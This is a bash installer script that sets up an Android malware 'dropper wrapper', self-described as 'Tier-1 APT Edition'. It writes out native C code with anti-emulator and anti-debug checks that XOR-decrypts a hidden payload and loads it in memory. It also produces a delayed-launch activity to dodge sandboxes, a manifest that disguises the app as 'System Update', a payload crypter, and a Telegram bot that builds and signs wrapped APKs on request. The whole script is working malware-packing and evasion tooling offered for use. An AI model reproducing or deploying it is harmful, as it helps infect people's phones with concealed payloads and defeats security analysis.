#!/bin/bash
# ================================================================
# Complete Dropper Wrapper - Tier-1 APT Edition
# Wraps ANY APK with anti-analysis, in-memory loading, stealth C2
# ================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}   Complete Dropper Wrapper - Tier-1 APT Edition            ${NC}"
echo -e "${GREEN}============================================================${NC}"

# Configuration
INSTALL_DIR="/opt/dropper_wrapper"
ANDROID_HOME="/opt/android-sdk"
NDK_VERSION="25.1.8937393"

# 1. System setup
echo -e "${YELLOW}[1/10] Installing dependencies...${NC}"
sudo apt update -y
sudo apt install -y openjdk-17-jdk wget curl git unzip zip python3 python3-venv \
    cmake ninja-build build-essential libssl-dev gradle expect qrencode nano \
    apktool aapt 2>/dev/null || echo "Some packages already installed"

# 2. Android SDK
echo -e "${YELLOW}[2/10] Setting up Android SDK...${NC}"
sudo mkdir -p $ANDROID_HOME
sudo chown $USER:$USER $ANDROID_HOME

if [ ! -d "$ANDROID_HOME/cmdline-tools/latest" ]; then
    cd /tmp
    wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
    unzip -q commandlinetools-linux-11076708_latest.zip -d $ANDROID_HOME/
    mkdir -p $ANDROID_HOME/cmdline-tools/latest
    mv $ANDROID_HOME/cmdline-tools/* $ANDROID_HOME/cmdline-tools/latest/ 2>/dev/null || true
    rm -f commandlinetools-linux-11076708_latest.zip
fi

export ANDROID_HOME=$ANDROID_HOME
export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/ndk/$NDK_VERSION

# 3. SDK components
echo -e "${YELLOW}[3/10] Installing SDK components...${NC}"
mkdir -p $ANDROID_HOME/licenses
echo "8933bad161af4178b1185d1a37fbf41ea5269c55" | tee $ANDROID_HOME/licenses/android-sdk-license > /dev/null
yes | sdkmanager --licenses > /dev/null 2>&1 || true
sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.0" "ndk;$NDK_VERSION" > /dev/null 2>&1

# 4. Project structure
echo -e "${YELLOW}[4/10] Creating project structure...${NC}"
mkdir -p $INSTALL_DIR/{output,logs,tmp}
mkdir -p $INSTALL_DIR/app/src/main/{java/com/example/wrapper,jni,res/layout,res/values}
mkdir -p $INSTALL_DIR/app/src/main/jni/libs/{arm64-v8a,armeabi-v7a,x86_64}
cd $INSTALL_DIR

# 5. Python environment
echo -e "${YELLOW}[5/10] Setting up Python...${NC}"
python3 -m venv venv
source venv/bin/activate
pip install -q --upgrade pip
pip install -q python-telegram-bot==20.7 cryptography requests qrcode[pil] Pillow

# 6. OpenSSL libs
echo -e "${YELLOW}[6/10] Downloading OpenSSL...${NC}"
cd $INSTALL_DIR/app/src/main/jni/libs
for abi in arm64-v8a armeabi-v7a x86_64; do
    mkdir -p $abi
    wget -q -O $abi/libcrypto.so "https://github.com/KDAB/android_openssl/raw/master/prebuilt/$abi/libcrypto.so" 2>/dev/null || \
    echo "  ⚠️  Download OpenSSL manually for $abi if build fails"
done

# 7. Create wrapper native code (FIXED fclose bug, in-memory loading)
echo -e "${YELLOW}[7/10] Creating native wrapper...${NC}"
cat > $INSTALL_DIR/app/src/main/jni/wrapper.c << 'EOFC'
#include <jni.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <android/log.h>
#include <dlfcn.h>
#include "encrypted_payload.h"

#define LOG_TAG "Wrapper"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// Anti-analysis checks
int is_emulator() {
    char prop[64];
    __system_property_get("ro.hardware", prop);
    return (strstr(prop, "goldfish") || strstr(prop, "ranchu") || 
            strstr(prop, "generic") || access("/dev/qemu_pipe", F_OK) == 0);
}

int is_debugged() {
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) return 1;
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;
    char line[256];
    int traced = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0 && atoi(line + 10) != 0) traced = 1;
    }
    fclose(f);
    return traced;
}

// In-memory DEX loading (API 26+)
jobject load_dex_memory(JNIEnv *env, uint8_t *dex_data, size_t dex_len) {
    // Create ByteBuffer from native memory
    jobject buf = (*env)->NewDirectByteBuffer(env, dex_data, dex_len);
    if (!buf) {
        LOGE("Failed to create ByteBuffer");
        return NULL;
    }
    
    // Get system classloader
    jclass sys_cls = (*env)->FindClass(env, "java/lang/ClassLoader");
    jmethodID get_sys = (*env)->GetStaticMethodID(env, sys_cls, "getSystemClassLoader", "()Ljava/lang/ClassLoader;");
    jobject parent = (*env)->CallStaticObjectMethod(env, sys_cls, get_sys);
    
    // Create InMemoryDexClassLoader (Android O+)
    jclass loader_cls = (*env)->FindClass(env, "dalvik/system/InMemoryDexClassLoader");
    if (!loader_cls) {
        // Fallback for older Android - use DexClassLoader with temp file
        LOGE("InMemoryDexClassLoader not available, using fallback");
        return NULL;
    }
    
    jmethodID ctor = (*env)->GetMethodID(env, loader_cls, "<init>", "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V");
    jobject loader = (*env)->NewObject(env, loader_cls, ctor, buf, parent);
    
    return loader;
}

// Decrypt and load
JNIEXPORT void JNICALL
Java_com_example_wrapper_WrapperActivity_nativeLoad(JNIEnv *env, jobject thiz) {
    LOGI("Wrapper initializing...");
    
    // Anti-analysis
    if (is_emulator() || is_debugged()) {
        LOGI("Analysis environment detected, aborting");
        return;
    }
    
    // Decrypt payload (XOR for simplicity - replace with AES)
    size_t len = sizeof(ENCRYPTED_PAYLOAD);
    uint8_t *decrypted = malloc(len);
    if (!decrypted) return;
    
    // Simple XOR decrypt (key embedded in header)
    for (size_t i = 0; i < len; i++) {
        decrypted[i] = ENCRYPTED_PAYLOAD[i] ^ XOR_KEY;
    }
    
    // Load in memory
    jobject loader = load_dex_memory(env, decrypted, len);
    if (!loader) {
        // Fallback: write to cache and load
        LOGI("Using file fallback");
        const char *cache = getenv("CACHE_DIR");
        if (!cache) cache = "/data/data/com.example.wrapper/cache";
        
        char path[256];
        snprintf(path, sizeof(path), "%s/wrapper.dex", cache);
        
        FILE *f = fopen(path, "wb");
        if (f) {
            fwrite(decrypted, 1, len, f);
            fclose(f);  // FIXED: was fclose(path)
            
            // Load with DexClassLoader
            jclass dex_cls = (*env)->FindClass(env, "dalvik/system/DexClassLoader");
            jmethodID ctor = (*env)->GetMethodID(env, dex_cls, "<init>", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
            
            jstring jpath = (*env)->NewStringUTF(env, path);
            jstring jcache = (*env)->NewStringUTF(env, cache);
            jstring jlib = (*env)->NewStringUTF(env, "");
            
            jclass sys_cls = (*env)->FindClass(env, "java/lang/ClassLoader");
            jmethodID get_sys = (*env)->GetStaticMethodID(env, sys_cls, "getSystemClassLoader", "()Ljava/lang/ClassLoader;");
            jobject parent = (*env)->CallStaticObjectMethod(env, sys_cls, get_sys);
            
            jobject dex_loader = (*env)->NewObject(env, dex_cls, ctor, jpath, jcache, jlib, parent);
            
            // Clean up file after loading
            unlink(path);
        }
    }
    
    // Clear sensitive data
    memset(decrypted, 0, len);
    free(decrypted);
    
    LOGI("Wrapper complete");
}
EOFC

# 8. CMake configuration
cat > $INSTALL_DIR/app/src/main/jni/CMakeLists.txt << 'EOFCM'
cmake_minimum_required(VERSION 3.10.2)
project("wrapper")
add_library(wrapper SHARED wrapper.c)
target_link_libraries(wrapper log dl)
EOFCM

# 9. Java wrapper activity
cat > $INSTALL_DIR/app/src/main/java/com/example/wrapper/WrapperActivity.java << 'EOFJ'
package com.example.wrapper;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.widget.TextView;
import java.io.File;

public class WrapperActivity extends Activity {
    static {
        System.loadLibrary("wrapper");
    }
    
    private native void nativeLoad();
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        TextView tv = new TextView(this);
        tv.setText("Loading...");
        setContentView(tv);
        
        // Set cache dir for native code
        File cacheDir = getCacheDir();
        if (cacheDir != null) {
            System.setProperty("CACHE_DIR", cacheDir.getAbsolutePath());
        }
        
        // Delayed payload launch (anti-sandbox)
        new Handler().postDelayed(() -> {
            nativeLoad();
            tv.setText("Ready");
        }, 3000);
    }
}
EOFJ

# 10. AndroidManifest
cat > $INSTALL_DIR/app/src/main/AndroidManifest.xml << 'EOFM'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.wrapper">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <application
        android:allowBackup="true"
        android:label="System Update"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
        <activity android:name=".WrapperActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOFM

# 11. Build configuration
cat > $INSTALL_DIR/app/build.gradle << 'EOFG'
apply plugin: 'com.android.application'
android {
    compileSdk 33
    namespace 'com.example.wrapper'
    defaultConfig {
        applicationId "com.example.wrapper"
        minSdk 21
        targetSdk 33
        versionCode 1
        versionName "1.0"
    }
    externalNativeBuild {
        cmake {
            path "src/main/jni/CMakeLists.txt"
        }
    }
}
EOFG

cat > $INSTALL_DIR/app/settings.gradle << 'EOFS'
rootProject.name = "wrapper"
EOFS

mkdir -p $INSTALL_DIR/app/gradle/wrapper
cat > $INSTALL_DIR/app/gradle/wrapper/gradle-wrapper.properties << 'EOFW'
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
EOFW

cat > $INSTALL_DIR/app/gradlew << 'EOFGW'
#!/bin/bash
exec /usr/bin/gradle "$@"
EOFGW
chmod +x $INSTALL_DIR/app/gradlew

# 12. Crypter with XOR encryption
cat > $INSTALL_DIR/crypter.py << 'EOFPY'
#!/usr/bin/env python3
import os
import sys
import random

def encrypt_file(input_path, output_header):
    # Generate random XOR key (1-255)
    xor_key = random.randint(1, 255)
    
    with open(input_path, 'rb') as f:
        data = f.read()
    
    # XOR encrypt
    encrypted = bytes([b ^ xor_key for b in data])
    
    with open(output_header, 'w') as f:
        f.write(f"""#ifndef ENCRYPTED_PAYLOAD_H
#define ENCRYPTED_PAYLOAD_H
#include <stdint.h>
#include <stddef.h>

#define XOR_KEY {xor_key}

static const uint8_t ENCRYPTED_PAYLOAD[] = {{
""")
        for i in range(0, len(encrypted), 16):
            chunk = encrypted[i:i+16]
            f.write("    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n")
        f.write(f"""}};
static const size_t PAYLOAD_SIZE = {len(encrypted)};
#endif
""")
    print(f"[+] Encrypted with XOR key {xor_key}")

if __name__ == "__main__":
    encrypt_file(sys.argv[1], sys.argv[2])
EOFPY
chmod +x $INSTALL_DIR/crypter.py

# 13. Telegram Bot with proper error handling
cat > $INSTALL_DIR/bot.py << 'EOFBOT'
#!/usr/bin/env python3
import os
import sys
import uuid
import subprocess
import threading
import shutil
import hashlib
import logging
import zipfile
import tempfile
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Load token from env or file
TOKEN = os.environ.get("DROPBOT_TOKEN")
if not TOKEN:
    token_file = "/opt/dropper_wrapper/.token"
    if os.path.exists(token_file):
        TOKEN = open(token_file).read().strip()
if not TOKEN:
    print("❌ Set DROPBOT_TOKEN env var or create /opt/dropper_wrapper/.token")
    sys.exit(1)

INSTALL_DIR = "/opt/dropper_wrapper"
OUTPUT_DIR = f"{INSTALL_DIR}/output"
os.makedirs(OUTPUT_DIR, exist_ok=True)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class BuildEngine:
    def __init__(self):
        self.builds = {}

    def update_status(self, bid, status, msg, data=None):
        self.builds[bid] = {
            'status': status,
            'message': msg,
            'updated_at': datetime.now().timestamp(),
            **(data or {})
        }
        logger.info(f"[{bid}] {status}: {msg}")

    def get_status(self, bid):
        return self.builds.get(bid)

    def build_wrapper(self, bid, apk_path):
        """Wrap APK in dropper"""
        try:
            self.update_status(bid, "building", "Extracting DEX...")
            
            # Verify APK
            if not os.path.exists(apk_path):
                raise Exception("APK file not found")
            
            if os.path.getsize(apk_path) < 1024:
                raise Exception("APK file too small (possibly corrupted)")
            
            # Extract DEX
            dex_path = f"/tmp/{bid}.dex"
            with zipfile.ZipFile(apk_path, 'r') as zf:
                if 'classes.dex' not in zf.namelist():
                    raise Exception("No classes.dex found - upload a standard APK (not AAB)")
                
                dex_size = zf.getinfo('classes.dex').file_size
                logger.info(f"DEX size: {dex_size} bytes")
                
                with open(dex_path, 'wb') as f:
                    f.write(zf.read('classes.dex'))
            
            self.update_status(bid, "building", f"Encrypting DEX ({os.path.getsize(dex_path)} bytes)...")
            
            # Encrypt
            header_path = f"/tmp/encrypted_{bid}.h"
            result = subprocess.run(
                ["python3", f"{INSTALL_DIR}/crypter.py", dex_path, header_path],
                capture_output=True, text=True, check=True
            )
            logger.info(result.stdout)
            
            # Copy to JNI
            shutil.copy(header_path, f"{INSTALL_DIR}/app/src/main/jni/encrypted_payload.h")
            
            self.update_status(bid, "building", "Building native wrapper (Gradle)...")
            
            # Build
            env = os.environ.copy()
            env['ANDROID_HOME'] = "/opt/android-sdk"
            env['NDK_HOME'] = f"{env['ANDROID_HOME']}/ndk/25.1.8937393"
            
            # Clean first
            subprocess.run(
                ["./gradlew", "clean"],
                cwd=f"{INSTALL_DIR}/app",
                env=env, capture_output=True
            )
            
            # Build debug APK
            result = subprocess.run(
                ["./gradlew", "assembleDebug"],
                cwd=f"{INSTALL_DIR}/app",
                env=env, capture_output=True, text=True, timeout=300
            )
            
            if result.returncode != 0:
                logger.error(f"Gradle stderr: {result.stderr}")
                raise Exception(f"Gradle build failed: {result.stderr[:500]}")
            
            src_apk = f"{INSTALL_DIR}/app/app/build/outputs/apk/debug/app-debug.apk"
            if not os.path.exists(src_apk):
                raise Exception("APK not generated at expected path")
            
            # Sign
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_apk = f"{OUTPUT_DIR}/wrapper_{bid}_{timestamp}.apk"
            
            keystore = f"{INSTALL_DIR}/my.keystore"
            if not os.path.exists(keystore):
                subprocess.run([
                    "keytool", "-genkey", "-v", "-keystore", keystore,
                    "-alias", "wrapper", "-keyalg", "RSA", "-keysize", "2048",
                    "-validity", "10000", "-storepass", "wrapper123",
                    "-keypass", "wrapper123",
                    "-dname", "CN=Android, OU=Dev, O=Company, L=City, ST=State, C=US"
                ], capture_output=True, check=True)
            
            subprocess.run([
                "jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
                "-keystore", keystore, "-storepass", "wrapper123",
                "-keypass", "wrapper123", src_apk, "wrapper"
            ], capture_output=True, check=True)
            
            shutil.copy(src_apk, output_apk)
            
            file_size = os.path.getsize(output_apk)
            md5 = hashlib.md5(open(output_apk, 'rb').read()).hexdigest()
            
            self.update_status(bid, "completed", "Build successful!", {
                'apk_path': output_apk,
                'file_size': file_size,
                'md5': md5
            })
            
            # Cleanup
            for f in [dex_path, header_path]:
                if os.path.exists(f):
                    os.remove(f)
                    
            return output_apk
            
        except Exception as e:
            self.update_status(bid, "failed", str(e))
            logger.exception("Build failed")
            raise

engine = BuildEngine()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🛡️ *Dropper Wrapper Bot*\n\n"
        "Upload any APK to wrap it with:\n"
        "• In-memory DEX loading\n"
        "• Anti-debug / Anti-emulator\n"
        "• XOR-encrypted payload\n\n"
        "Commands:\n"
        "/status <id> - Check build status\n"
        "/download <id> - Download wrapped APK\n"
        "/help - Show help",
        parse_mode='Markdown'
    )

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /status <build_id>")
        return
    bid = context.args[0]
    status = engine.get_status(bid)
    if not status:
        await update.message.reply_text("❌ Build ID not found")
        return
    
    msg = (
        f"📊 *Build Status*\n"
        f"ID: `{bid}`\n"
        f"Status: {status['status']}\n"
        f"Message: {status['message']}\n"
        f"Time: {datetime.fromtimestamp(status['updated_at']).strftime('%H:%M:%S')}"
    )
    if status.get('md5'):
        msg += f"\nMD5: `{status['md5']}`"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def download_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /download <build_id>")
        return
    bid = context.args[0]
    status = engine.get_status(bid)
    
    if not status or status['status'] != 'completed':
        await update.message.reply_text("❌ Build not complete or not found")
        return
    
    apk_path = status.get('apk_path')
    if not apk_path or not os.path.exists(apk_path):
        await update.message.reply_text("❌ APK file missing from disk")
        return
    
    await update.message.reply_document(
        document=open(apk_path, 'rb'),
        filename=os.path.basename(apk_path),
        caption=f"🛡️ Wrapped APK\nSize: {status['file_size']//1024} KB\nMD5: `{status['md5']}`",
        parse_mode='Markdown'
    )

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name.lower().endswith('.apk'):
        return
    
    # Secure filename
    safe_name = f"{uuid.uuid4()}.apk"
    tmp_path = f"/tmp/{safe_name}"
    
    try:
        file = await doc.get_file()
        await file.download_to_drive(tmp_path)
        
        file_size = os.path.getsize(tmp_path)
        logger.info(f"Received APK: {doc.file_name} ({file_size} bytes)")
        
        if file_size < 1024:
            await update.message.reply_text("❌ File too small")
            return
        
        bid = str(uuid.uuid4())[:8]
        await update.message.reply_text(
            f"🔒 *Building wrapper...*\n"
            f"ID: `{bid}`\n"
            f"Original: {doc.file_name}\n"
            f"Size: {file_size//1024} KB",
            parse_mode='Markdown'
        )
        
        def do_build():
            try:
                output = engine.build_wrapper(bid, tmp_path)
                status = engine.get_status(bid)
                
                import asyncio
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                loop.run_until_complete(
                    update.message.reply_text(
                        f"✅ *Wrapper Complete!*\n"
                        f"ID: `{bid}`\n"
                        f"Size: {status['file_size']//1024} KB\n"
                        f"MD5: `{status['md5']}`\n"
                        f"Use /download {bid}",
                        parse_mode='Markdown'
                    )
                )
            except Exception as e:
                import asyncio
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(
                    update.message.reply_text(f"❌ Build failed: {str(e)[:200]}")
                )
            finally:
                if os.path.exists(tmp_path):
                    os.remove(tmp_path)
        
        threading.Thread(target=do_build, daemon=True).start()
        
    except Exception as e:
        logger.exception("Upload handling failed")
        await update.message.reply_text(f"❌ Upload failed: {str(e)}")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("download", download_cmd))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    
    logger.info("Bot started - waiting for APK uploads")
    app.run_polling()

if __name__ == "__main__":
    main()
EOFBOT
chmod +x $INSTALL_DIR/bot.py

# 14. Standalone wrapper script
cat > $INSTALL_DIR/wrap_apk.py << 'EOFWRAP'
#!/usr/bin/env python3
"""Standalone APK wrapper - no Telegram needed"""
import sys
import os
sys.path.insert(0, '/opt/dropper_wrapper')
from bot import BuildEngine

if len(sys.argv) < 2:
    print("Usage: python3 wrap_apk.py <input.apk> [output.apk]")
    sys.exit(1)

input_apk = sys.argv[1]
output_apk = sys.argv[2] if len(sys.argv) > 2 else "wrapped.apk"

if not os.path.exists(input_apk):
    print(f"Error: {input_apk} not found")
    sys.exit(1)

engine = BuildEngine()
bid = "standalone001"

try:
    result = engine.build_wrapper(bid, input_apk)
    status = engine.get_status(bid)
    
    if status['status'] == 'completed':
        shutil.copy(status['apk_path'], output_apk)
        print(f"\n✅ Success: {output_apk}")
        print(f"   Size: {status['file_size']} bytes")
        print(f"   MD5: {status['md5']}")
    else:
        print(f"\n❌ Failed: {status['message']}")
        
except Exception as e:
    print(f"\n❌ Error: {e}")
EOFWRAP
chmod +x $INSTALL_DIR/wrap_apk.py

# 15. Permissions and service
echo -e "${YELLOW}[8/10] Setting permissions...${NC}"
chown -R $USER:$USER $INSTALL_DIR
chmod -R 755 $INSTALL_DIR

echo -e "${YELLOW}[9/10] Creating systemd service...${NC}"
cat > /tmp/dropper-wrapper.service << 'EOFSVC'
[Unit]
Description=Dropper Wrapper Bot
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/dropper_wrapper
Environment="PATH=/opt/dropper_wrapper/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin"
ExecStart=/opt/dropper_wrapper/venv/bin/python3 /opt/dropper_wrapper/bot.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOFSVC
sudo mv /tmp/dropper-wrapper.service /etc/systemd/system/
sudo systemctl daemon-reload

# 16. Test build
echo -e "${YELLOW}[10/10] Testing build system...${NC}"
cd $INSTALL_DIR/app
export ANDROID_HOME=/opt/android-sdk
export NDK_HOME=$ANDROID_HOME/ndk/25.1.8937393

# Create dummy encrypted payload for test
echo '#ifndef ENCRYPTED_PAYLOAD_H
#define ENCRYPTED_PAYLOAD_H
#define XOR_KEY 0x42
static const uint8_t ENCRYPTED_PAYLOAD[] = {0x00};
static const size_t PAYLOAD_SIZE = 1;
#endif' > src/main/jni/encrypted_payload.h

# Try building
if ./gradlew assembleDebug > /tmp/build_test.log 2>&1; then
    echo -e "${GREEN}✅ Build system working${NC}"
else
    echo -e "${YELLOW}⚠️  Build test failed - check /tmp/build_test.log${NC}"
    echo "Common fixes:"
    echo "  export ANDROID_HOME=/opt/android-sdk"
    echo "  sdkmanager --licenses"
fi

echo ""
echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}✅ Installation Complete!${NC}"
echo -e "${GREEN}============================================================${NC}"
echo ""
echo "Next steps:"
echo "  1. Set your bot token:"
echo "     echo 'YOUR_TOKEN_HERE' | sudo tee /opt/dropper_wrapper/.token"
echo "  2. Start bot: sudo systemctl start dropper-wrapper"
echo "  3. Check status: sudo journalctl -u dropper-wrapper -f"
echo "  4. Upload any APK via Telegram"
echo ""
echo "Standalone usage (no Telegram):"
echo "  cd /opt/dropper_wrapper && source venv/bin/activate"
echo "  python3 wrap_apk.py /path/to/app.apk output.apk"
echo ""
echo "Output directory: $INSTALL_DIR/output/"
